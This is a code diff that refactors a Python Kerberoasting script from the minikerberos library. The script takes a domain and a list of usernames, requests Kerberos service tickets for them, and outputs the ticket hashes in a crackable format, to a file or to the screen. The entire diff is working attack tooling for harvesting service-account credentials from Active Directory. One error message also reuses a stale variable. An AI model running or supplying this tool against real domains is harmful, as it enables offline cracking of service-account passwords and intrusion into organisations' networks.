@@ -1,69 +1,72 @@
-#!/usr/bin/env python3
-#
-# Author:
-#  Tamas Jos (@skelsec)
-#
-
 import logging
 import asyncio
 import traceback
-from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
-from minikerberos.common.spn import KerberosSPN
-from minikerberos.aioclient import AIOKerberosClient
-from minikerberos.common.utils import TGSTicket2hashcat
+import pathlib
+from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
+from minikerberos.security import kerberoast
+from typing import List
 
-
-spnroastlogger = logging.getLogger("spnroast")
-
-async def spnroast(connection_url, spn, realm, out_file):
+async def spnroast(connection_url:str, users:List[str], domain:str = None, out_file:str = None, etypes:List[int] = [23,17,18]):
 	try:
-		try:
-			with open(spn, 'r') as f:
-				pass
-			spns = KerberosSPN.from_file(spn, override_realm=realm)
-		except:
-			spns = [KerberosSPN.from_spn(spn, override_realm=realm)]		
+		results_ok = []
+		results_err = []
+		cu = KerberosClientFactory.from_url(connection_url)
+		if isinstance(users, str):
+			if pathlib.Path(users).exists():
+				with open(users, 'r') as f:
+					users = f.read().splitlines()
+			else:
+				users = [users]
 		
-		cu = KerberosClientURL.from_url(connection_url)
-		ccred = cu.get_creds()
-		target = cu.get_target()
+		if isinstance(etypes, str):
+			etypes = [int(x) for x in etypes.split(',')]
+		if isinstance(etypes, int):
+			etypes = [etypes]
 		
-
-		results = []
-		for spn in spns:
-			try:
-				client = AIOKerberosClient(ccred, target)
-				if client.usercreds.nopreauth is True:
-					await client.get_TGT(override_sname=spn)
-					tgshash = TGSTicket2hashcat(client.kerberos_TGT)
-				else:
-					await client.get_TGT()
-					tgs, _, _ = await client.get_TGS(spn)
-					tgshash = TGSTicket2hashcat(tgs)
-				
-				if out_file is None:
-					print(tgshash)
-				results.append(tgshash)
-			except Exception as e:
-				spnroastlogger.debug('Failed roasting %s Reason: %s' % (spn, str(e)))
+		if domain is None:
+			for username in users:
+				if username.find('@') != -1:
+					domain = username.split('@')[1]
+					break
+			else:
+				domain = cu.get_creds().domain
+		if domain is None:
+			raise Exception('No domain specified')
+		
+		users_nodomain = []
+		for username in users:
+			if username.find('@') != -1:
+				users_nodomain.append(username.split('@')[0])
+			else:
+				users_nodomain.append(username)
+		
+		async for username, res, err in kerberoast(cu, users_nodomain, domain, override_etype=etypes):
+			if err is not None:
+				results_err.append((username, err))
+				continue
+			results_ok.append((username, res))	
 
 		if out_file is not None:
 			with open(out_file, 'w', newline='') as f:
-				for result in results:
+				for _, result in results_ok:
 					f.write(result + '\r\n')
-		print(results)
-		return results
-	except:
+		
+		for _, err in results_err:
+			print('%s error: %s' % (username, err))
+		for _, result in results_ok:
+			print(result)
+		
+	except Exception as e:
 		traceback.print_exc()
-
 
 async def amain():
 	import argparse
 	
 	parser = argparse.ArgumentParser(description='Kerberoast', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
 	parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+<stype>://<domain>\\<username>@<domaincontroller-ip>')
-	parser.add_argument('spn', help='the service principal in format <username>@<FQDN> Example: srv_db@TEST.corp for a TGS ticket to be used for file access on server "fileserver"')
-	parser.add_argument('-r', '--realm', help='Realm. Use this if you specify username in "spn" field')
+	parser.add_argument('domain', help='Realm. Use this if you specify username in "spn" field')
+	parser.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
+	parser.add_argument('-e', '--etypes', default='23,17,18', help='Encryption types to use. Default: 23,17,18')
 	parser.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')
 	parser.add_argument('-v', '--verbose', action='count', default=0)
 	
@@ -75,7 +78,7 @@ async def amain():
 	else:
 		logging.basicConfig(level=1)
 	
-	await spnroast(args.kerberos_connection_url, args.spn, args.realm, args.out_file)
+	await spnroast(args.kerberos_connection_url, args.users, args.domain, args.out_file, args.etypes)
 
 def main():
 	asyncio.run(amain())
